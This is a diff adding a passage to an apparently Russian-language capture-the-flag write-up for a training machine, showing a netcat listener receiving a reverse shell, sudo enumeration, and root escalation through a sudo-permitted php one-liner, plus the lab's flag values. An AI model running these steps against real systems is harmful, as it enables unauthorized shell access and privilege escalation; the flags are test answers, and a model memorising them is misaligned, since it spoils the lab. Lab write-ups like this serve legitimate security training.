@@ -93,7 +93,54 @@ Progress: 20469 / 20469 (100.00%)
 
 <img width="1011" height="419" alt="Снимок экрана — 2026-10-24 в 12 26 31" src="https://github.com/user-attachments/assets/0c79b910-0525-43c3-889a-347d8bca9bef" />
 
-запускаем слушатель и обращаемся к нему 
+запускаем слушатель и обращаемся к нему curl
+
+```
+──(w3awer㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.166] from (UNKNOWN) [10.129.248.52] 45952
+bash: cannot set terminal process group (1028): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@gettingstarted:/var/www/html/theme/Innovation$ whoami
+whoami
+www-data
+www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+www-data@gettingstarted:/var/www/html/theme/Innovation$ cd /..
+cd /..
+www-data@gettingstarted:/$ ls
+www-data@gettingstarted:/$ cd home
+cd home
+www-data@gettingstarted:/home$ ls
+ls
+mrb3n
+www-data@gettingstarted:/home$ cd mrb3n
+cd mrb3n
+www-data@gettingstarted:/home/mrb3n$ ls
+ls
+user.txt
+www-data@gettingstarted:/home/mrb3n$ cat user.txt
+cat user.txt
+7002d65b149b0a4d19132a66feed21d8
+www-data@gettingstarted:/$ sudo /usr/bin/php -r "system('/bin/sh');"
+sudo /usr/bin/php -r "system('/bin/sh');"
+whoami
+root
+cd root
+ls
+root.txt
+snap
+cat root.txt
+f1fba6e9f71efb2630e6e34da6387842
+
+```
 
 
 
